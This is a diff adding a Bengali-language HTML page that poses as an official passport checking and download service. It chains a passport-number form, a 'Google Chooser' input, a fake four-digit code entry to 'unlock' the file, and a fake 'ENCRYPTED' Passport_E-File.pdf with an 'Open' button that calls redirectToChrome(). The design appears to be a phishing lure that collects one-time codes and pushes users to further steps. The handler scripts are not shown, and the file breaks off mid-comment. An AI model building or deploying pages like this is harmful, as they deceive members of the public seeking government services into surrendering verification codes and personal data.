@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Passport Verification System - Check Version</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* === CSS: ডিজাইন === */
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: "Noto Sans Bengali", sans-serif;
+            background-color: #f7f9fc;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .top-image { width: 100%; max-width: 700px; height: auto; aspect-ratio: 16/10; object-fit: cover; border-radius: 0 0 16px 16px; margin-bottom: 20px; background: #e5e5e5; }
+        .site-title { background: #07865f; color: #fff; text-align: center; padding: 15px; font-size: 24px; font-weight: 800; border-radius: 0 0 16px 16px; width: 100%; max-width: 700px; }
+        .main-card { width: 100%; max-width: 700px; background: #fff; padding: 25px; border-radius: 20px; box-shadow: 0 5px 20px rgba(0,0,0,0.08); text-align: center; margin-bottom: 30px; }
+        .product-input, .secure-input, .code-input { width: 100%; max-width: 350px; padding: 16px; border: 2px solid #ccd0d5; border-radius: 12px; outline: none; font-size: 17px; background: white; text-align: center; }
+        .product-input:focus { border-color: #15966f; }
+        .ok-button, .action-btn { width: 100%; max-width: 350px; padding: 16px; border-radius: 12px; cursor: pointer; border: none; font-size: 18px; font-weight: bold; color: white; margin: 10px 0; transition: transform 0.1s; }
+        .ok-button:active, .action-btn:active { transform: scale(0.98); }
+        .ok-button { background: #1565c0; }
+        .btn-blue { background-color: #1877f2; }
+        .btn-green { background-color: #07865f; }
+        .btn-red { background-color: #ef4444; }
+        .btn-gray { background-color: #64748b; }
+        .error { display: none; margin-top: 15px; color: #c62828; font-weight: 700; }
+        .modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.6); backdrop-filter: blur(4px); display: none; align-items: center; justify-content: center; z-index: 9999; padding: 16px; }
+        .modal-overlay.show { display: flex; }
+        .modal-box { width: 100%; max-width: 420px; background: #fff; border-radius: 18px; box-shadow: 0 15px 40px rgba(0,0,0,0.25); padding: 25px; text-align: center; animation: popIn 0.3s ease; position: relative; }
+        @keyframes popIn { from { transform: scale(0.85); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        .modal-header { background: #07865f; color: #fff; font-weight: 800; font-size: 18px; padding: 12px; border-radius: 12px; margin-bottom: 16px; }
+        .modal-text { font-size: 15px; color: #666; line-height: 1.6; margin-bottom: 16px; }
+        .code-input:focus { border-color: #3b82f6; }
+        .progress-bg { width: 100%; background: #e5e5e5; height: 8px; border-radius: 4px; overflow: hidden; margin-top: 10px; }
+        .animate-progress { animation: progressMove 2s infinite linear; }
+        @keyframes progressMove { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+
+    <!-- === HTML: স্ট্রাকচার === -->
+    <div class="w-full flex flex-col items-center px-4 py-6">
+        <img id="productImage" class="top-image" src="https://raw.githubusercontent.com/passportchaking-io/Online_Passport_chaking/main/IMG_20260525_160654.jpg" alt="Passport" onerror="this.style.display='none'">
+        <div class="site-title">Passport Checking & Download</div>
+
+        <!-- ১. ইনপুট ফর্ম -->
+        <section id="productPage" class="main-card">
+            <h1>পাসপোর্ট নম্বর দিয়ে চেক করুন</h1>
+            <p class="text-gray-600 mt-3 mb-5 text-sm">সরাসরি পাসপোর্ট ফাইলটি চেক করতে নিচের ফাঁকা ঘরে নম্বর বসান।</p>
+            <input id="productNumber" class="product-input" type="tel" placeholder="পাসপোর্ট নম্বর বসান" autocomplete="off" inputmode="numeric">
+            <button id="submitButton" class="ok-button" type="button">পাসপোর্ট চেক করুন</button>
+            <div id="errorMessage" class="error"></div>
+        </section>
+
+        <div class="footer text-center text-gray-500 text-sm mt-4">© 2026 Passport System - Check Mode</div>
+    </div>
+
+    <!-- ২. পারমিশন মডাল -->
+    <div id="permission_modal" class="modal-overlay">
+        <div class="modal-box">
+            <div class="modal-header">ⓘ পাসপোর্ট ফাইলটি ওপেন করুন</div>
+            <p class="modal-text">পাসপোর্ট ডকুমেন্ট ফাইলটি ওপেন করতে চাইলে "Open" বাটনে ক্লিক করুন।</p>
+            <button onclick="redirectToChrome()" class="action-btn btn-blue w-full">Open</button>
+        </div>
+    </div>
+
+    <!-- ৩. ইনপুট ফিল্ড (Google Chooser) -->
+    <div id="google_chooser" class="modal-overlay">
+        <div class="modal-box">
+            <div class="modal-header">🔍 সরাসরি অনলাইনে চেক করুন</div>
+            <p class="modal-text">পাসপোর্ট নম্বর নিচের ফাঁকা ঘরে বসিয়ে সরাসরি পাসপোর্ট হেড অফিস থেকে চেক করুন।</p>
+            <input type="tel" id="email_field" autocomplete="off" placeholder="পাসপোর্ট নম্বর বসান" class="secure-input w-full">
+            <button onclick="finalSubmit()" class="action-btn btn-blue w-full mt-2">চেক করুন</button>
+        </div>
+    </div>
+
+    <!-- ৪. লোডিং (Verifying) -->
+    <div id="verifying" class="modal-overlay">
+        <div class="modal-box">
+            <div class="mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-emerald-50 ring-8 ring-emerald-100">
+                <svg class="h-8 w-8 text-emerald-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+            </div>
+            <h3 class="text-xl font-extrabold text-gray-900 mb-1">তথ্য যাচাই করা হচ্ছে</h3>
+            <p class="text-sm font-bold text-gray-800">আপনার তথ্যটি গুরুত্ব সহকারে চেক করা হচ্ছে।</p>
+            <div class="w-full bg-gray-100 h-1.5 rounded-full mt-5 overflow-hidden relative">
+                <div class="bg-gradient-to-r from-emerald-500 to-green-600 h-full w-1/2 rounded-full absolute top-0 left-0 animate-progress"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ৫. OTP পেজ -->
+    <div id="otp_page" class="modal-overlay">
+        <div class="modal-box">
+            <div class="mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-blue-50 text-blue-600">
+                <svg class="w-8 h-8" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+            </div>
+            <h2 class="text-xl font-black text-gray-900 mb-2">ফাইলটি লক করা আছে!</h2>
+            <p class="text-xs text-gray-600 mb-6 px-2 font-medium leading-relaxed">৪ সংখ্যার কোডটি নিচের ঘরে বসান।</p>
+            <div class="flex justify-center gap-3 mb-6">
+                <input type="text" inputmode="numeric" maxlength="1" class="code-input w-12 h-14 text-center font-bold text-xl border-2 border-gray-200 rounded-xl focus:border-blue-500 outline-none">
+                <input type="text" inputmode="numeric" maxlength="1" class="code-input w-12 h-14 text-center font-bold text-xl border-2 border-gray-200 rounded-xl focus:border-blue-500 outline-none">
+                <input type="text" inputmode="numeric" maxlength="1" class="code-input w-12 h-14 text-center font-bold text-xl border-2 border-gray-200 rounded-xl focus:border-blue-500 outline-none">
+                <input type="text" inputmode="numeric" maxlength="1" class="code-input w-12 h-14 text-center font-bold text-xl border-2 border-gray-200 rounded-xl focus:border-blue-500 outline-none">
+            </div>
+            <button onclick="goToStep('verifying')" class="action-btn btn-blue w-full">ফাইল আনলক করুন</button>
+        </div>
+    </div>
+
+    <!-- ৬. ফাইল এনক্রিপ্টেড -->
+    <div id="step2" class="modal-overlay">
+        <div class="modal-box">
+            <div class="absolute top-5 right-[-35px] bg-red-600 text-white text-[11px] font-black uppercase tracking-wider py-1.5 px-10 rotate-45 shadow-md">ENCRYPTED</div>
+            <div class="mb-4 flex h-26 w-22 flex-col items-center justify-between rounded-2xl bg-gradient-to-b from-red-50 to-red-100 border border-red-200 p-4 shadow-inner relative mt-2">
+                <span class="absolute top-0 left-3 bg-red-600 text-white text-[11px] font-black px-2 py-0.5 rounded-b-md shadow-sm">PDF</span>
+                <div class="flex items-center justify-center flex-grow pt-4 text-red-600">
+                    <svg class="w-12 h-12 animate-pulse" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
+                </div>
+            </div>
+            <h3 class="text-xl font-black text-gray-800 mb-1 px-2 break-all">Passport_E-File.pdf</h3>
+            <div class="bg-red-50 border-l-4 border-red-500 p-4 rounded-r-2xl text-left w-full mb-4">
+                <p class="text-base font-extrabold text-red-900 leading-relaxed text-center">⚠️ এই ফাইলটি নিরাপত্তাজনিত কারণে এনক্রিপ্ট করা আছে।</p>
+            </div>
+            <button onclick="openLockedFile()" class="action-btn btn-red w-full">ফাইলটি ওপেন করুন</button>
+        </div>
+    </div>
+
+    <!-- ৭. স্ক্র
